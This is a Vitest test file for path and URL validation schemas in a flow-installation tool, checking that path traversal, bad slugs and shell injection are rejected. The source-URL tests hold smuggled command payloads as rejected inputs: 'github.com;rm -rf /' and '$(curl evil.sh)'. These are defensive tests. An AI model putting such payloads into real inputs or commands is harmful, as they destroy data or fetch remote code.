import os from "node:os";

import { describe, expect, it } from "vitest";

import {
  flowIdSchema,
  projectFlowSymlinkPath,
  projectSlugSchema,
  sourceUrlSchema,
  systemCachePath,
  versionTagSchema,
  workspaceRootSchema,
} from "@/lib/flow-paths";
import { MaisterError, isMaisterError } from "@/lib/errors";

describe("systemCachePath", () => {
  it("returns <HOME>/.maister/flows/<id>@<version> on the happy path", () => {
    expect(systemCachePath("bugfix", "v1.2.3")).toBe(
      `${os.homedir()}/.maister/flows/bugfix@v1.2.3`,
    );
  });

  it("accepts versions with +build metadata (semver)", () => {
    expect(systemCachePath("flow1", "v1.0.0-rc.1+build.5")).toBe(
      `${os.homedir()}/.maister/flows/flow1@v1.0.0-rc.1+build.5`,
    );
  });
});

describe("projectFlowSymlinkPath", () => {
  it("returns <workspaceRoot>/.maister/<slug>/flows/<flowId>", () => {
    expect(projectFlowSymlinkPath("/repos/foo", "foo", "bugfix")).toBe(
      "/repos/foo/.maister/foo/flows/bugfix",
    );
  });
});

describe("flowIdSchema (SINK invariant)", () => {
  it("rejects flowId containing '/'", () => {
    expect(() => systemCachePath("bug/fix", "v1.0.0")).toThrowError(
      MaisterError,
    );
    try {
      systemCachePath("bug/fix", "v1.0.0");
    } catch (err) {
      expect(isMaisterError(err) && err.code).toBe("FLOW_INSTALL");
    }
  });

  it("rejects flowId equal to '..'", () => {
    expect(() => systemCachePath("..", "v1.0.0")).toThrowError(MaisterError);
  });

  it("rejects flowId containing '..' as substring", () => {
    expect(() => systemCachePath("a..b", "v1.0.0")).toThrowError(MaisterError);
  });

  it("rejects flowId equal to '.'", () => {
    expect(() => systemCachePath(".", "v1.0.0")).toThrowError(MaisterError);
  });

  it("rejects empty flowId", () => {
    expect(() => systemCachePath("", "v1.0.0")).toThrowError(MaisterError);
  });

  it("rejects flowId longer than 64 chars", () => {
    const tooLong = "a".repeat(65);

    expect(() => systemCachePath(tooLong, "v1.0.0")).toThrowError(MaisterError);
  });

  it("rejects flowId with whitespace", () => {
    expect(() => systemCachePath("bug fix", "v1.0.0")).toThrowError(
      MaisterError,
    );
  });
});

describe("versionTagSchema (SINK invariant)", () => {
  it("rejects version containing '/'", () => {
    expect(() => systemCachePath("bugfix", "v1/0/0")).toThrowError(
      MaisterError,
    );
  });

  it("rejects version equal to '..'", () => {
    expect(() => systemCachePath("bugfix", "..")).toThrowError(MaisterError);
  });

  it("rejects empty version", () => {
    expect(() => systemCachePath("bugfix", "")).toThrowError(MaisterError);
  });

  it("accepts plain semver and arbitrary tag names", () => {
    expect(versionTagSchema.safeParse("v1.0.0").success).toBe(true);
    expect(versionTagSchema.safeParse("main").success).toBe(true);
    expect(versionTagSchema.safeParse("release-2026-05-26").success).toBe(true);
  });
});

describe("projectSlugSchema", () => {
  it("accepts kebab-case slugs", () => {
    expect(projectSlugSchema.safeParse("my-app").success).toBe(true);
    expect(projectSlugSchema.safeParse("foundation-app").success).toBe(true);
    expect(projectSlugSchema.safeParse("a1").success).toBe(true);
  });

  it("rejects PascalCase / snake_case / leading hyphen", () => {
    expect(projectSlugSchema.safeParse("MyApp").success).toBe(false);
    expect(projectSlugSchema.safeParse("my_app").success).toBe(false);
    expect(projectSlugSchema.safeParse("-my-app").success).toBe(false);
    expect(projectSlugSchema.safeParse("my-app-").success).toBe(false);
  });

  it("rejects empty projectSlug via projectFlowSymlinkPath", () => {
    expect(() =>
      projectFlowSymlinkPath("/repos/foo", "", "bugfix"),
    ).toThrowError(MaisterError);
  });
});

describe("workspaceRootSchema", () => {
  it("rejects relative workspaceRoot", () => {
    expect(() =>
      projectFlowSymlinkPath("relative/path", "foo", "bugfix"),
    ).toThrowError(MaisterError);
  });

  it("rejects workspaceRoot containing '..' segment", () => {
    expect(() =>
      projectFlowSymlinkPath("/repos/../etc", "foo", "bugfix"),
    ).toThrowError(MaisterError);
  });

  it("accepts plain absolute paths", () => {
    expect(workspaceRootSchema.safeParse("/repos/foo").success).toBe(true);
    expect(workspaceRootSchema.safeParse("/tmp/test").success).toBe(true);
  });
});

describe("sourceUrlSchema", () => {
  it("accepts HTTPS git URLs", () => {
    expect(
      sourceUrlSchema.safeParse("https://github.com/org/repo.git").success,
    ).toBe(true);
  });

  it("accepts shorthand source identifiers", () => {
    expect(sourceUrlSchema.safeParse("github.com/org/repo").success).toBe(true);
  });

  it("accepts SSH-style URLs", () => {
    expect(
      sourceUrlSchema.safeParse("git@github.com:org/repo.git").success,
    ).toBe(true);
  });

  it("accepts file:// URLs (used by integration test fixtures)", () => {
    expect(
      sourceUrlSchema.safeParse("file:///tmp/fixtures/flow-plugin.git").success,
    ).toBe(true);
  });

  it("rejects whitespace", () => {
    expect(sourceUrlSchema.safeParse("github.com /org/repo").success).toBe(
      false,
    );
  });

  it("rejects shell metacharacters", () => {
    expect(sourceUrlSchema.safeParse("github.com;rm -rf /").success).toBe(
      false,
    );
    expect(sourceUrlSchema.safeParse("github.com&attack").success).toBe(false);
    expect(sourceUrlSchema.safeParse("$(curl evil.sh)").success).toBe(false);
  });

  it("rejects empty source", () => {
    expect(sourceUrlSchema.safeParse("").success).toBe(false);
  });
});

describe("flowIdSchema export (independent of systemCachePath)", () => {
  it("exposes a parsable schema for callers that need a raw zod check", () => {
    expect(flowIdSchema.safeParse("valid").success).toBe(true);
    expect(flowIdSchema.safeParse("../escape").success).toBe(false);
  });
});
